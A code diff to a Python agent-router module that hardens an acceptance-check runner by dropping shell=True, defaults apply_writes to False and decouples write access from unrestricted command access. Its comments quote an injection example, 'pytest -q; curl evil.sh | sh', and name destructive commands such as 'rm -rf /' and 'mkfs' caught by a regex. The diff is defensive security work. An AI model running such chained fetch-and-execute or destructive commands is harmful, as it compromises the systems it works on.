@@ -41,6 +41,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+import shlex
 import subprocess
 import time
 from pathlib import Path
@@ -83,14 +84,27 @@ def _changed(before: dict[str, str], after: dict[str, str]) -> list[str]:
     return sorted(k for k in set(before) | set(after) if before.get(k) != after.get(k))
 
 
-def _run_check(check: str, cwd: Path, timeout: float) -> tuple[bool, str]:
+def _run_check(check: str | list[str], cwd: Path, timeout: float) -> tuple[bool, str]:
     """Run the caller's acceptance check. Its exit code is the verdict.
 
     Deliberately a subprocess and not something the worker can influence: the
     whole point is that the model which did the work does not grade it.
+
+    NO SHELL. This ran `subprocess.run(check, shell=True, ...)` until 2026-09-14,
+    which made one string on an MCP tool call a general command-injection
+    primitive — `pytest -q; curl evil.sh | sh` is two commands, and nothing
+    sanitised it. `run_command` inside the agent loop had the right pattern all
+    along (agent_loop.py: shlex.split + shell=False); this now matches it.
+
+    A string is still accepted and split with `shlex`, so existing callers keep
+    working, but shell METACHARACTERS no longer mean anything: `;`, `|`, `&&`,
+    `$(...)` and redirections become literal arguments to one program.
     """
+    argv = list(check) if isinstance(check, (list, tuple)) else shlex.split(check or "")
+    if not argv:
+        return False, "acceptance check was empty"
     try:
-        r = subprocess.run(check, shell=True, capture_output=True, text=True,
+        r = subprocess.run(argv, capture_output=True, text=True,
                            cwd=str(cwd), timeout=max(1.0, timeout))
     except subprocess.TimeoutExpired:
         return False, f"acceptance check timed out after {timeout:.0f}s"
@@ -106,7 +120,7 @@ async def llm_local_task(
     acceptance_check: str | None = None,
     model: str = DEFAULT_MODEL,
     budget_s: float = DEFAULT_BUDGET_S,
-    apply_writes: bool = True,
+    apply_writes: bool = False,
 ) -> str:
     """Run a whole multi-step task on a local model and report a typed result.
 
@@ -120,7 +134,15 @@ async def llm_local_task(
             reported as ``proposed``, because nothing established that it works.
         model: Ollama model to drive the loop.
         budget_s: Wall-clock ceiling for the whole task, check included.
-        apply_writes: Whether edits reach disk. False leaves the loop in its
+        apply_writes: Whether edits reach disk. Defaults to False since
+            2026-09-14: True ALSO set LLM_ROUTER_AGENT_COMMANDS=all, and
+            agent_writes.guard_command returns True immediately under `all`,
+            skipping the entire inspection allowlist. What remained was a regex
+            catching `rm -rf /`, `mkfs`, `dd` and `curl|sh` — not `cp`, `mv`,
+            `tee` or `git`. Writes themselves are confined to project_root by
+            agent_loop._resolve_path; run_command arguments are not. A tool whose
+            default grants that much authority is one granted by accident.
+            False leaves the loop in its
             default ``propose`` mode, where it computes diffs and changes
             nothing.
 
@@ -155,7 +177,10 @@ async def llm_local_task(
     prev_cmds = os.environ.get("LLM_ROUTER_AGENT_COMMANDS")
     if apply_writes:
         os.environ["LLM_ROUTER_AGENT_WRITES"] = "apply"
-        os.environ["LLM_ROUTER_AGENT_COMMANDS"] = "all"
+        # Applying WRITES must not also unlock arbitrary COMMANDS. These were
+        # raised together, so asking for an edit on disk silently bought the
+        # whole allowlist as well. Set LLM_ROUTER_AGENT_COMMANDS deliberately if
+        # that is really wanted.
 
     try:
         from llm_router.context_injection import inject
